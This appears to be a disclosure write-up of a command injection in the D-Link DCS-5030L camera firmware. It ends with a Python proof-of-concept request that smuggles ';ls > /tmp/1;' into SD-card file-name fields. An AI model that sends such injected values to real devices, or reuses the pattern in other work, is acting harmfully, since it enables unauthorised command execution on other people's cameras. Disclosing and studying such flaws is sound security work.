# command injection

## D-LINK DCS-5030L

version: V1.07.02

## Description:

There is a command injection in alphapd/sub_425120

## Source:

you may download it from : [legacyfiles.us.dlink.com - /DCS-5030L/REVA/FIRMWARE/](http://legacyfiles.us.dlink.com/DCS-5030L/REVA/FIRMWARE/)

## Analyse:

![](11.png)

If ConfigSDCard equal to Rename, call sdcardsetRename.

![](12.png)

we can execute aribitrary command via parameter v3 and parameter v4.

## POC

```
url = "http://192.168.1.13/setManageSDCardManage"
headers = {
    'Host': '192.168.1.13',
    'Authorization': 'Basic base64(admin:password)',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}
data = {
    'ReplySuccessPage':'advanced.htm',
    'ReplyErrorPage':'errradv.htm',
    'SDCardNewFileName':';ls > /tmp/1;',
    'SDCardSelectedFile':';ls > /tmp/1;',
    'ConfigSDCard':'Rename'
}
r = requests.post(url, data=data,headers=headers)
```
